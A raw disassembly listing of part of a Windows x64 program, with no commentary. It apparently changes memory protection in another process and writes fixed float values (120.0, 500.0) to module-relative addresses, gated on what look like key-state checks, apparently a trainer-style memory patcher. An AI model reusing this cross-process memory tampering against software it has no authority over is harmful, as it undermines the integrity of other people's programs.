   140002054:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
   140002059:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   14000205f:	4c 89 e1             	mov    %r12,%rcx
   140002062:	48 89 fa             	mov    %rdi,%rdx
   140002065:	41 b9 40 00 00 00    	mov    $0x40,%r9d
   14000206b:	e8 f6 c6 01 00       	call   0x14001e766
   140002070:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140002077:	00 00 
   140002079:	41 b9 02 00 00 00    	mov    $0x2,%r9d
   14000207f:	4c 89 e1             	mov    %r12,%rcx
   140002082:	48 89 fa             	mov    %rdi,%rdx
   140002085:	4c 8d 85 ac 02 00 00 	lea    0x2ac(%rbp),%r8
   14000208c:	e8 db c6 01 00       	call   0x14001e76c
   140002091:	44 8b 8d 98 02 00 00 	mov    0x298(%rbp),%r9d
   140002098:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
   14000209d:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   1400020a3:	4c 89 e1             	mov    %r12,%rcx
   1400020a6:	48 89 fa             	mov    %rdi,%rdx
   1400020a9:	e8 b8 c6 01 00       	call   0x14001e766
   1400020ae:	b0 01                	mov    $0x1,%al
   1400020b0:	89 85 88 02 00 00    	mov    %eax,0x288(%rbp)
   1400020b6:	48 8d 85 d8 01 00 00 	lea    0x1d8(%rbp),%rax
   1400020bd:	48 89 85 98 02 00 00 	mov    %rax,0x298(%rbp)
   1400020c4:	48 63 8d d8 01 00 00 	movslq 0x1d8(%rbp),%rcx
   1400020cb:	48 81 f9 00 01 00 00 	cmp    $0x100,%rcx
   1400020d2:	0f 83 56 06 00 00    	jae    0x14000272e
   1400020d8:	80 bc 0d b0 00 00 00 	cmpb   $0x0,0xb0(%rbp,%rcx,1)
   1400020df:	00 
   1400020e0:	8a 85 dc 01 00 00    	mov    0x1dc(%rbp),%al
   1400020e6:	74 49                	je     0x140002131
   1400020e8:	84 c0                	test   %al,%al
   1400020ea:	74 1f                	je     0x14000210b
   1400020ec:	4c 89 f1             	mov    %r14,%rcx
   1400020ef:	48 8d 95 90 02 00 00 	lea    0x290(%rbp),%rdx
   1400020f6:	4c 8d 85 58 02 00 00 	lea    0x258(%rbp),%r8
   1400020fd:	4c 8d 8d 70 02 00 00 	lea    0x270(%rbp),%r9
   140002104:	e8 77 1f 00 00       	call   0x140004080
   140002109:	eb 4d                	jmp    0x140002158
   14000210b:	4c 89 f1             	mov    %r14,%rcx
   14000210e:	48 8d 95 90 02 00 00 	lea    0x290(%rbp),%rdx
   140002115:	4c 8d 85 58 02 00 00 	lea    0x258(%rbp),%r8
   14000211c:	4c 8d 8d 70 02 00 00 	lea    0x270(%rbp),%r9
   140002123:	e8 68 1d 00 00       	call   0x140003e90
   140002128:	c6 85 dc 01 00 00 01 	movb   $0x1,0x1dc(%rbp)
   14000212f:	b0 01                	mov    $0x1,%al
   140002131:	84 c0                	test   %al,%al
   140002133:	0f 94 c1             	sete   %cl
   140002136:	40 08 f1             	or     %sil,%cl
   140002139:	75 26                	jne    0x140002161
   14000213b:	4c 89 f1             	mov    %r14,%rcx
   14000213e:	48 8d 95 90 02 00 00 	lea    0x290(%rbp),%rdx
   140002145:	4c 8d 85 58 02 00 00 	lea    0x258(%rbp),%r8
   14000214c:	4c 8d 8d 70 02 00 00 	lea    0x270(%rbp),%r9
   140002153:	e8 28 1f 00 00       	call   0x140004080
   140002158:	c6 85 dc 01 00 00 00 	movb   $0x0,0x1dc(%rbp)
   14000215f:	31 c0                	xor    %eax,%eax
   140002161:	84 db                	test   %bl,%bl
   140002163:	74 06                	je     0x14000216b
   140002165:	84 c0                	test   %al,%al
   140002167:	75 2a                	jne    0x140002193
   140002169:	eb 45                	jmp    0x1400021b0
   14000216b:	84 c0                	test   %al,%al
   14000216d:	75 24                	jne    0x140002193
   14000216f:	4c 89 f1             	mov    %r14,%rcx
   140002172:	48 8d 95 90 02 00 00 	lea    0x290(%rbp),%rdx
   140002179:	4c 8d 85 58 02 00 00 	lea    0x258(%rbp),%r8
   140002180:	4c 8d 8d 70 02 00 00 	lea    0x270(%rbp),%r9
   140002187:	e8 04 1d 00 00       	call   0x140003e90
   14000218c:	c6 85 dc 01 00 00 01 	movb   $0x1,0x1dc(%rbp)
   140002193:	4c 89 f1             	mov    %r14,%rcx
   140002196:	48 8d 95 90 02 00 00 	lea    0x290(%rbp),%rdx
   14000219d:	4c 8d 85 58 02 00 00 	lea    0x258(%rbp),%r8
   1400021a4:	4c 8d 8d 70 02 00 00 	lea    0x270(%rbp),%r9
   1400021ab:	e8 60 21 00 00       	call   0x140004310
   1400021b0:	45 84 ff             	test   %r15b,%r15b
   1400021b3:	0f 84 9f 00 00 00    	je     0x140002258
   1400021b9:	45 84 ed             	test   %r13b,%r13b
   1400021bc:	0f 84 a7 00 00 00    	je     0x140002269
   1400021c2:	48 8b 95 80 02 00 00 	mov    0x280(%rbp),%rdx
   1400021c9:	48 83 fa 05          	cmp    $0x5,%rdx
   1400021cd:	0f 86 ef 05 00 00    	jbe    0x1400027c2
   1400021d3:	48 8b 85 70 02 00 00 	mov    0x270(%rbp),%rax
   1400021da:	48 8b 78 28          	mov    0x28(%rax),%rdi
   1400021de:	48 03 bd a0 02 00 00 	add    0x2a0(%rbp),%rdi
   1400021e5:	c7 85 ac 02 00 00 00 	movl   $0x42f00000,0x2ac(%rbp)
   1400021ec:	00 f0 42 
   1400021ef:	c7 85 98 02 00 00 00 	movl   $0x0,0x298(%rbp)
   1400021f6:	00 00 00 
   1400021f9:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
   1400021fe:	41 b8 04 00 00 00    	mov    $0x4,%r8d
   140002204:	4c 89 e1             	mov    %r12,%rcx
   140002207:	48 89 fa             	mov    %rdi,%rdx
   14000220a:	41 b9 40 00 00 00    	mov    $0x40,%r9d
   140002210:	e8 51 c5 01 00       	call   0x14001e766
   140002215:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   14000221c:	00 00 
   14000221e:	41 b9 04 00 00 00    	mov    $0x4,%r9d
   140002224:	4c 89 e1             	mov    %r12,%rcx
   140002227:	48 89 fa             	mov    %rdi,%rdx
   14000222a:	4c 8d 85 ac 02 00 00 	lea    0x2ac(%rbp),%r8
   140002231:	e8 36 c5 01 00       	call   0x14001e76c
   140002236:	44 8b 8d 98 02 00 00 	mov    0x298(%rbp),%r9d
   14000223d:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
   140002242:	41 b8 04 00 00 00    	mov    $0x4,%r8d
   140002248:	4c 89 e1             	mov    %r12,%rcx
   14000224b:	48 89 fa             	mov    %rdi,%rdx
   14000224e:	e8 13 c5 01 00       	call   0x14001e766
   140002253:	e9 4e 01 00 00       	jmp    0x1400023a6
   140002258:	40 84 f6             	test   %sil,%sil
   14000225b:	0f 84 a9 00 00 00    	je     0x14000230a
   140002261:	40 b6 01             	mov    $0x1,%sil
   140002264:	e9 40 01 00 00       	jmp    0x1400023a9
   140002269:	48 8b 95 80 02 00 00 	mov    0x280(%rbp),%rdx
   140002270:	48 83 fa 05          	cmp    $0x5,%rdx
   140002274:	0f 86 81 05 00 00    	jbe    0x1400027fb
   14000227a:	48 8b 85 70 02 00 00 	mov    0x270(%rbp),%rax
   140002281:	48 8b 78 28          	mov    0x28(%rax),%rdi
   140002285:	48 03 bd a0 02 00 00 	add    0x2a0(%rbp),%rdi
   14000228c:	c7 85 ac 02 00 00 00 	movl   $0x43fa0000,0x2ac(%rbp)
   140002293:	00 fa 43 
   140002296:	c7 85 98 02 00 00 00 	movl   $0x0,0x298(%rbp)
   14000229d:	00 00 00 
   1400022a0:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
   1400022a5:	41 b8 04 00 00 00    	mov    $0x4,%r8d
   1400022ab:	4c 89 e1             	mov    %r12,%rcx
   1400022ae:	48 89 fa             	mov    %rdi,%rdx
   1400022b1:	41 b9 40 00 00 00    	mov    $0x40,%r9d
   1400022b7:	e8 aa c4 01 00       	call   0x14001e766
   1400022bc:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   1400022c3:	00 00 
   1400022c5:	41 b9 04 00 00 00    	mov    $0x4,%r9d
   1400022cb:	4c 89 e1             	mov    %r12,%rcx
   1400022ce:	48 89 fa             	mov    %rdi,%rdx
   1400022d1:	4c 8d 85 ac 02 00 00 	lea    0x2ac(%rbp),%r8
   1400022d8:	e8 8f c4 01 00       	call   0x14001e76c
   1400022dd:	44 8b 8d 98 02 00 00 	mov    0x298(%rbp),%r9d
   1400022e4:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
   1400022e9:	41 b8 04 00 00 00    	mov    $0x4,%r8d
   1400022ef:	4c 89 e1             	mov    %r12,%rcx
   1400022f2:	48 89 fa             	mov    %rdi,%rdx
   1400022f5:	e8 6c c4 01 00       	call   0x14001e766
   1400022fa:	41 b5 01             	mov    $0x1,%r13b
   1400022fd:	40 84 f6             	test   %sil,%sil
   140002300:	40 b6 01             	mov    $0x1,%sil
   140002303:	74 0e                	je     0x140002313
   140002305:	e9 41 01 00 00       	jmp    0x14000244b
   14000230a:	45 84 ed             	test   %r13b,%r13b
   14000230d:	0f 84 91 00 00 00    	je     0x1400023a4
   140002313:	48 8b 95 80 02 00 00 	mov    0x280(%rbp),%rdx
   14000231a:	48 83 fa 05          	cmp    $0x5,%rdx
   14000231e:	0f 86 ea 04 00 00    	jbe    0x14000280e
   140002324:	48 8b 85 70 02 00 00 	mov    0x270(%rbp),%rax
   14000232b:	48 8b 78 28          	mov    0x28(%rax),%rdi
   14000232f:	48 03 bd a0 02 00 00 	add    0x2a0(%rbp),%rdi
   140002336:	c7 85 ac 02 00 00 00 	movl   $0x42f00000,0x2ac(%rbp)
   14000233d:	00 f0 42 
   140002340:	c7 85 98 02 00 00 00 	movl   $0x0,0x298(%rbp)
   140002347:	00 00 00 
   14000234a:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
   14000234f:	41 b8 04 00 00 00    	mov    $0x4,%r8d
   140002355:	4c 89 e1             	mov    %r12,%rcx
   140002358:	48 89 fa             	mov    %rdi,%rdx
   14000235b:	41 b9 40 00 00 00    	mov    $0x40,%r9d
   140002361:	e8 00 c4 01 00       	call   0x14001e766
   140002366:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   14000236d:	00 00 
   14000236f:	41 b9 04 00 00 00    	mov    $0x4,%r9d
   140002375:	4c 89 e1             	mov    %r12,%rcx
   140002378:	48 89 fa             	mov    %rdi,%rdx
   14000237b:	4c 8d 85 ac 02 00 00 	lea    0x2ac(%rbp),%r8
   140002382:	e8 e5 c3 01 00       	call   0x14001e76c
   140002387:	44 8b 8d 98 02 00 00 	mov    0x298(%rbp),%r9d
   14000238e:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
   140002393:	41 b8 04 00 00 00    	mov    $0x4,%r8d
   140002399:	4c 89 e1             	mov    %r12,%rcx
   14000239c:	48 89 fa             	mov    %rdi,%rdx
   14000239f:	e8 c2 c3 01 00       	call   0x14001e766
   1400023a4:	31 f6                	xor    %esi,%esi
   1400023a6:	45 31 ed             	xor    %r13d,%r13d
   1400023a9:	45 84 ed             	test   %r13b,%r13b
   1400023ac:	0f 95 c0             	setne  %al
   1400023af:	08 d8                	or     %bl,%al
   1400023b1:	0f 85 94 00 00 00    	jne    0x14000244b
   1400023b7:	48 8b 95 80 02 00 00 	mov    0x280(%rbp),%rdx
   1400023be:	48 83 fa 05          	cmp    $0x5,%rdx
   1400023c2:	0f 86 d4 03 00 00    	jbe    0x14000279c
   1400023c8:	48 8b 85 70 02 00 00 	mov    0x270(%rbp),%rax
   1400023cf:	48 8b 78 28          	mov    0x28(%rax),%rdi
   1400023d3:	48 03 bd a0 02 00 00 	add    0x2a0(%rbp),%rdi
   1400023da:	c7 85 ac 02 00 00 00 	movl   $0x43fa0000,0x2ac(%rbp)
   1400023e1:	00 fa 43 
   1400023e4:	c7 85 98 02 00 00 00 	movl   $0x0,0x298(%rbp)
   1400023eb:	00 00 00 
   1400023ee:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
   1400023f3:	41 b8 04 00 00 00    	mov    $0x4,%r8d
   1400023f9:	4c 89 e1             	mov    %r12,%rcx
   1400023fc:	48 89 fa             	mov    %rdi,%rdx
   1400023ff:	41 b9 40 00 00 00    	mov    $0x40,%r9d
   140002405:	e8 5c c3 01 00       	call   0x14001e766
   14000240a:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140002411:	00 00 
   140002413:	41 b9 04 00 00 00    	mov    $0x4,%r9d
   140002419:	4c 89 e1             	mov    %r12,%rcx
   14000241c:	48 89 fa             	mov    %rdi,%rdx
   14000241f:	4c 8d 85 ac 02 00 00 	lea    0x2ac(%rbp),%r8
   140002426:	e8 41 c3 01 00       	call   0x14001e76c
   14000242b:	44 8b 8d 98 02 00 00 	mov    0x298(%rbp),%r9d
   140002432:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
   140002437:	41 b8 04 00 00 00    	mov    $0x4,%r8d
   14000243d:	4c 89 e1             	mov    %r12,%rcx
   140002440:	48 89 fa             	mov    %rdi,%rdx
   140002443:	e8 1e c3 01 00       	call   0x14001e766
   140002448:	41 b5 01             	mov    $0x1,%r13b
   14000244b:	48 8d 85 20 02 00 00 	lea    0x220(%rbp),%rax
   140002452:	48 89 85 98 02 00 00 	mov    %rax,0x298(%rbp)
   140002459:	48 63 8d 20 02 00 00 	movslq 0x220(%rbp),%rcx
   140002460:	48 81 f9 ff 00 00 00 	cmp    $0xff,%rcx
   140002467:	0f 87 d7 02 00 00    	ja     0x140002744
   14000246d:	80 bc 0d b0 00 00 00 	cmpb   $0x0,0xb0(%rbp,%rcx,1)
   140002474:	00 
   140002475:	8a 85 24 02 00 00    	mov    0x224(%rbp),%al
   14000247b:	74 49                	je     0x1400024c6
   14000247d:	84 c0                	test   %al,%al
   14000247f:	74 1f                	je     0x1400024a0
   140002481:	4c 89 f1             	mov    %r14,%rcx
   140002484:	48 8d 95 90 02 00 00 	lea    0x290(%rbp),%rdx
   14000248b:	4c 8d 85 58 02 00 00 	lea    0x258(%rbp),%r8
   140002492:	4c 8d 8d 70 02 00 00 	lea    0x270(%rbp),%r9
   140002499:	e8 92 24 00 00       	call   0x140004930
   14000249e:	eb 4d                	jmp    0x1400024ed
   1400024a0:	4c 89 f1             	mov    %r14,%rcx
   1400024a3:	48 8d 95 90 02 00 00 	lea    0x290(%rbp),%rdx
   1400024aa:	4c 8d 85 58 02 00 00 	lea    0x258(%rbp),%r8
   1400024b1:	4c 8d 8d 70 02 00 00 	lea    0x270(%rbp),%r9
   1400024b8:	e8 63 22 00 00       	call   0x140004720
   1400024bd:	c6 85 24 02 00 00 01 	movb   $0x1,0x224(%rbp)
   1400024c4:	b0 01                	mov    $0x1,%al
   1400024c6:	84 c0                	test   %al,%al
   1400024c8:	0f 94 c1             	sete   %cl
   1400024cb:	40 08 f1             	or     %sil,%cl
   1400024ce:	75 26                	jne    0x1400024f6
   1400024d0:	4c 89 f1             	mov    %r14,%rcx
   1400024d3:	48 8d 95 90 02 00 00 	lea    0x290(%rbp),%rdx
   1400024da:	4c 8d 85 58 02 00 00 	lea    0x258(%rbp),%r8
   1400024e1:	4c 8d 8d 70 02 00 00 	lea    0x270(%rbp),%r9
   1400024e8:	e8 43 24 00 00       	call   0x140004930
   1400024ed:	c6 85 24 02 00 00 00 	movb   $0x0,0x224(%rbp)
   1400024f4:	31 c0                	xor    %eax,%eax
   1400024f6:	84 c0                	test   %al,%al
   1400024f8:	0f 95 c0             	setne  %al
   1400024fb:	08 d8                	or     %bl,%al
   1400024fd:	75 24                	jne    0x140002523
   1400024ff:	4c 89 f1             	mov    %r14,%rcx
   140002502:	48 8d 95 90 02 00 00 	lea    0x290(%rbp),%rdx
   140002509:	4c 8d 85 58 02 00 00 	lea    0x258(%rbp),%r8
   140002510:	4c 8d 8d 70 02 00 00 	lea    0x270(%rbp),%r9
   140002517:	e8 04 22 00 00       	call   0x140004720
   14000251c:	c6 85 24 02 00 00 01 	movb   $0x1,0x224(%rbp)
   140002523:	48 8d 85 f8 01 00 00 	lea    0x1f8(%rbp),%rax
   14000252a:	48 89 85 98 02 00 00 	mov    %rax,0x298(%rbp)
   140002531:	48 63 8d f8 01 00 00 	movslq 0x1f8(%rbp),%rcx
   140002538:	48 81 f9 00 01 00 00 	cmp    $0x100,%rcx
   14000253f:	0f 83 15 02 00 00    	jae    0x14000275a
   140002545:	80 bc 0d b0 00 00 00 	cmpb   $0x0,0xb0(%rbp,%rcx,1)
   14000254c:	00 
   14000254d:	8a 85 fc 01 00 00    	mov    0x1fc(%rbp),%al
   140002553:	74 49                	je     0x14000259e
   140002555:	84 c0                	test   %al,%al
   140002557:	74 1f                	je     0x140002578
   140002559:	4c 89 f1             	mov    %r14,%rcx
   14000255c:	48 8d 95 90 02 00 00 	lea    0x290(%rbp),%rdx
   140002563:	4c 8d 85 58 02 00 00 	lea    0x258(%rbp),%r8
   14000256a:	4c 8d 8d 70 02 00 00 	lea    0x270(%rbp),%r9
   140002571:	e8 da 12 00 00       	call   0x140003850
   140002576:	eb 4d                	jmp    0x1400025c5
   140002578:	4c 89 f1             	mov    %r14,%rcx
   14000257b:	48 8d 95 90 02 00 00 	lea    0x290(%rbp),%rdx
   140002582:	4c 8d 85 58 02 00 00 	lea    0x258(%rbp),%r8
   140002589:	4c 8d 8d 70 02 00 00 	lea    0x270(%rbp),%r9
   140002590:	e8 7b 11 00 00       	call   0x140003710
   140002595:	c6 85 fc 01 00 00 01 	movb   $0x1,0x1fc(%rbp)
   14000259c:	b0 01                	mov    $0x1,%al
   14000259e:	84 c0                	test   %al,%al
   1400025a0:	0f 94 c1             	sete   %cl
   1400025a3:	40 08 f1             	or     %sil,%cl
   1400025a6:	75 26                	jne    0x1400025ce
   1400025a8:	4c 89 f1             	mov    %r14,%rcx
   1400025ab:	48 8d 95 90 02 00 00 	lea    0x290(%rbp),%rdx
   1400025b2:	4c 8d 85 58 02 00 00 	lea    0x258(%rbp),%r8
   1400025b9:	4c 8d 8d 70 02 00 00 	lea    0x270(%rbp),%r9
   1400025c0:	e8 8b 12 00 00       	call   0x140003850
   1400025c5:	c6 85 fc 01 00 00 00 	movb   $0x0,0x1fc(%rbp)
   1400025cc:	31 c0                	xor    %eax,%eax
   1400025ce:	84 c0                	test   %al,%al
   1400025d0:	0f 95 c0             	setne  %al
   1400025d3:	08 d8                	or     %bl,%al
   1400025d5:	75 24                	jne    0x1400025fb
   1400025d7:	4c 89 f1             	mov    %r14,%rcx
   1400025da:	48 8d 95 90 02 00 00 	lea    0x290(%rbp),%rdx
   1400025e1:	4c 8d 85 58 02 00 00 	lea    0x258(%rbp),%r8
   1400025e8:	4c 8d 8d 70 02 00 00 	lea    0x270(%rbp),%r9
   1400025ef:	e8 1c 11 00 00       	call   0x140003710
   1400025f4:	c6 85 fc 01 00 00 01 	movb   $0x1,0x1fc(%rbp)
   1400025fb:	48 63 8d 10 02 00 00 	movslq 0x210(%rbp),%rcx
   140002602:	48 81 f9 00 01 00 00 	cmp    $0x100,%rcx
   140002609:	0f 83 61 01 00 00    	jae    0x140002770
   14000260f:	80 bc 0d b0 00 00 00 	cmpb   $0x0,0xb0(%rbp,%rcx,1)
   140002616:	00 
   140002617:	8a 85 14 02 00 00    	mov    0x214(%rbp),%al
   14000261d:	74 49                	je     0x140002668
   14000261f:	84 c0                	test   %al,%al
   140002621:	74 1f                	je     0x140002642
   140002623:	4c 89 f1             	mov    %r14,%rcx
   140002626:	48 8d 95 90 02 00 00 	lea    0x290(%rbp),%rdx
   14000262d:	4c 8d 85 58 02 00 00 	lea    0x258(%rbp),%r8
   140002634:	4c 8d 8d 70 02 00 00 	lea    0x270(%rbp),%r9
   14000263b:	e8 50 26 00 00       	call   0x140004c90
   140002640:	eb 4d                	jmp    0x14000268f
   140002642:	4c 89 f1             	mov    %r14,%rcx
   140002645:	48 8d 95 90 02 00 00 	lea    0x290(%rbp),%rdx
   14000264c:	4c 8d 85 58 02 00 00 	lea    0x258(%rbp),%r8
   140002653:	4c 8d 8d 70 02 00 00 	lea    0x270(%rbp),%r9
   14000265a:	e8 e1 24 00 00       	call   0x140004b40
   14000265f:	c6 85 14 02 00 00 01 	movb   $0x1,0x214(%rbp)
   140002666:	b0 01                	mov    $0x1,%al
   140002668:	84 c0                	test   %al,%al
   14000266a:	0f 94 c1             	sete   %cl
   14000266d:	40 08 ce             	or     %cl,%sil
   140002670:	75 26                	jne    0x140002698
   140002672:	4c 89 f1             	mov    %r14,%rcx
   140002675:	48 8d 95 90 02 00 00 	lea    0x290(%rbp),%rdx
   14000267c:	4c 8d 85 58 02 00 00 	lea    0x258(%rbp),%r8
   140002683:	4c 8d 8d 70 02 00 00 	lea    0x270(%rbp),%r9
   14000268a:	e8 01 26 00 00       	call   0x140004c90
   14000268f:	c6 85 14 02 00 00 00 	movb   $0x0,0x214(%rbp)
   140002696:	31 c0                	xor    %eax,%eax
   140002698:	84 c0                	test   %al,%al
   14000269a:	0f 95 c0             	setne  %al
   14000269d:	08 c3                	or     %al,%bl
   14000269f:	0f 85 01 f7 ff ff    	jne    0x140001da6
   1400026a5:	4c 89 f1             	mov    %r14,%rcx
   1400026a8:	48 8d 95 90 02 00 00 	lea    0x290(%rbp),%rdx
   1400026af:	4c 8d 85 58 02 00 00 	lea    0x258(%rbp),%r8
   1400026b6:	4c 8d 8d 70 02 00 00 	lea    0x270(%rbp),%r9
   1400026bd:	e8 7e 24 00 00       	call   0x140004b40
   1400026c2:	c6 85 14 02 00 00 01 	movb   $0x1,0x214(%rbp)
   1400026c9:	e9 d8 f6 ff ff       	jmp    0x140001da6
   1400026ce:	40 b6 01             	mov    $0x1,%sil
   1400026d1:	80 bd 8d 01 00 00 00 	cmpb   $0x0,0x18d(%rbp)
   1400026d8:	0f 94 c3             	sete   %bl
   1400026db:	0f 85 30 f9 ff ff    	jne    0x140002011
   1400026e1:	e9 d0 f9 ff ff       	jmp    0x1400020b6
   1400026e6:	80 bd 8d 01 00 00 00 	cmpb   $0x0,0x18d(%rbp)
   1400026ed:	0f 94 c3             	sete   %bl
   1400026f0:	40 b6 01             	mov    $0x1,%sil
   1400026f3:	e9 b6 f9 ff ff       	jmp    0x1400020ae
   1400026f8:	88 a5 b0 00 00 00    	mov    %ah,0xb0(%rbp)
   1400026fe:	48 8d 05 6b ef 01 00 	lea    0x1ef6b(%rip),%rax        # 0x140021670
   140002705:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000270a:	48 8d 0d bf ed 01 00 	lea    0x1edbf(%rip),%rcx        # 0x1400214d0
   140002711:	4c 8d 0d 08 ee 01 00 	lea    0x1ee08(%rip),%r9        # 0x140021520
   140002718:	4c 8d 85 b0 00 00 00 	lea    0xb0(%rbp),%r8
   14000271f:	ba 2b 00 00 00       	mov    $0x2b,%edx
   140002724:	e8 67 d2 01 00       	call   0x14001f990
   140002729:	e9 f1 00 00 00       	jmp    0x14000281f
   14000272e:	4c 8d 05 43 ee 01 00 	lea    0x1ee43(%rip),%r8        # 0x140021578
   140002735:	ba 00 01 00 00       	mov    $0x100,%edx
   14000273a:	e8 41 d3 01 00       	call   0x14001fa80
   14000273f:	e9 db 00 00 00       	jmp    0x14000281f
   140002744:	4c 8d 05 2d ee 01 00 	lea    0x1ee2d(%rip),%r8        # 0x140021578
   14000274b:	ba 00 01 00 00       	mov    $0x100,%edx
   140002750:	e8 2b d3 01 00       	call   0x14001fa80
   140002755:	e9 c5 00 00 00       	jmp    0x14000281f
   14000275a:	4c 8d 05 17 ee 01 00 	lea    0x1ee17(%rip),%r8        # 0x140021578
   140002761:	ba 00 01 00 00       	mov    $0x100,%edx
   140002766:	e8 15 d3 01 00       	call   0x14001fa80
   14000276b:	e9 af 00 00 00       	jmp    0x14000281f
   140002770:	4c 8d 05 01 ee 01 00 	lea    0x1ee01(%rip),%r8        # 0x140021578
   140002777:	ba 00 01 00 00       	mov    $0x100,%edx
   14000277c:	e8 ff d2 01 00       	call   0x14001fa80
   140002781:	e9 99 00 00 00       	jmp    0x14000281f
   140002786:	4c 8d 05 9b f1 01 00 	lea    0x1f19b(%rip),%r8        # 0x140021928
   14000278d:	b9 08 00 00 00       	mov    $0x8,%ecx
   140002792:	e8 e9 d2 01 00       	call   0x14001fa80
   140002797:	e9 83 00 00 00       	jmp    0x14000281f
   14000279c:	4c 8d 05 1d f2 01 00 	lea    0x1f21d(%rip),%r8        # 0x1400219c0
   1400027a3:	b9 05 00 00 00       	mov    $0x5,%ecx
   1400027a8:	e8 d3 d2 01 00       	call   0x14001fa80
   1400027ad:	eb 70                	jmp    0x14000281f
   1400027af:	4c 8d 05 8a f1 01 00 	lea    0x1f18a(%rip),%r8        # 0x140021940
   1400027b6:	b9 08 00 00 00       	mov    $0x8,%ecx
   1400027bb:	e8 c0 d2 01 00       	call   0x14001fa80
   1400027c0:	eb 5d                	jmp    0x14000281f
   1400027c2:	4c 8d 05 0f f2 01 00 	lea    0x1f20f(%rip),%r8        # 0x1400219d8
   1400027c9:	b9 05 00 00 00       	mov    $0x5,%ecx
   1400027ce:	e8 ad d2 01 00       	call   0x14001fa80
   1400027d3:	eb 4a                	jmp    0x14000281f
   1400027d5:	4c 8d 05 64 f1 01 00 	lea    0x1f164(%rip),%r8        # 0x140021940
   1400027dc:	b9 08 00 00 00       	mov    $0x8,%ecx
   1400027e1:	e8 9a d2 01 00       	call   0x14001fa80
   1400027e6:	eb 37                	jmp    0x14000281f
   1400027e8:	4c 8d 05 39 f1 01 00 	lea    0x1f139(%rip),%r8        # 0x140021928
   1400027ef:	b9 08 00 00 00       	mov    $0x8,%ecx
   1400027f4:	e8 87 d2 01 00       	call   0x14001fa80
   1400027f9:	eb 24                	jmp    0x14000281f
   1400027fb:	4c 8d 05 be f1 01 00 	lea    0x1f1be(%rip),%r8        # 0x1400219c0
   140002802:	b9 05 00 00 00       	mov    $0x5,%ecx
   140002807:	e8 74 d2 01 00       	call   0x14001fa80
   14000280c:	eb 11                	jmp    0x14000281f
   14000280e:	4c 8d 05 c3 f1 01 00 	lea    0x1f1c3(%rip),%r8        # 0x1400219d8
   140002815:	b9 05 00 00 00       	mov    $0x5,%ecx
   14000281a:	e8 61 d2 01 00       	call   0x14001fa80
   14000281f:	0f 0b                	ud2
   140002821:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   140002828:	00 00 00 
   14000282b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002830:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   140002835:	55                   	push   %rbp
   140002836:	41 57                	push   %r15
   140002838:	41 56                	push   %r14
   14000283a:	41 55                	push   %r13
   14000283c:	41 54                	push   %r12
   14000283e:	56                   	push   %rsi
   14000283f:	57                   	push   %rdi
   140002840:	53                   	push   %rbx
   140002841:	48 83 ec 28          	sub    $0x28,%rsp
   140002845:	48 8d aa 80 00 00 00 	lea    0x80(%rdx),%rbp
   14000284c:	48 8d 8d 20 02 00 00 	lea    0x220(%rbp),%rcx
   140002853:	e8 a8 e7 ff ff       	call   0x140001000
   140002858:	90                   	nop
   140002859:	48 83 c4 28          	add    $0x28,%rsp
   14000285d:	5b                   	pop    %rbx
   14000285e:	5f                   	pop    %rdi
   14000285f:	5e                   	pop    %rsi
   140002860:	41 5c                	pop    %r12
   140002862:	41 5d                	pop    %r13
   140002864:	41 5e                	pop    %r14
   140002866:	41 5f                	pop    %r15
   140002868:	5d                   	pop    %rbp
   140002869:	c3                   	ret
   14000286a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140002870:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   140002875:	55                   	push   %rbp
   140002876:	41 57                	push   %r15
   140002878:	41 56                	push   %r14
   14000287a:	41 55                	push   %r13
   14000287c:	41 54                	push   %r12
   14000287e:	56                   	push   %rsi
   14000287f:	57                   	push   %rdi
   140002880:	53                   	push   %rbx
   140002881:	48 83 ec 28          	sub    $0x28,%rsp
   140002885:	48 8d aa 80 00 00 00 	lea    0x80(%rdx),%rbp
   14000288c:	48 8b b5 a0 02 00 00 	mov    0x2a0(%rbp),%rsi
   140002893:	48 8b 0e             	mov    (%rsi),%rcx
   140002896:	48 8b 56 08          	mov    0x8(%rsi),%rdx
   14000289a:	e8 91 e8 ff ff       	call   0x140001130
   14000289f:	48 89 f1             	mov    %rsi,%rcx
   1400028a2:	e8 79 e8 ff ff       	call   0x140001120
   1400028a7:	90                   	nop
   1400028a8:	48 83 c4 28          	add    $0x28,%rsp
   1400028ac:	5b                   	pop    %rbx
   1400028ad:	5f                   	pop    %rdi
   1400028ae:	5e                   	pop    %rsi
   1400028af:	41 5c                	pop    %r12
   1400028b1:	41 5d                	pop    %r13
   1400028b3:	41 5e                	pop    %r14
   1400028b5:	41 5f                	pop    %r15
   1400028b7:	5d                   	pop    %rbp
   1400028b8:	c3                   	ret
   1400028b9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   1400028c0:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   1400028c5:	55                   	push   %rbp
   1400028c6:	41 57                	push   %r15
   1400028c8:	41 56                	push   %r14
   1400028ca:	41 55                	push   %r13
   1400028cc:	41 54                	push   %r12
   1400028ce:	56                   	push   %rsi
   1400028cf:	57                   	push   %rdi
   1400028d0:	53                   	push   %rbx
   1400028d1:	48 83 ec 28          	sub    $0x28,%rsp
   1400028d5:	48 8d aa 80 00 00 00 	lea    0x80(%rdx),%rbp
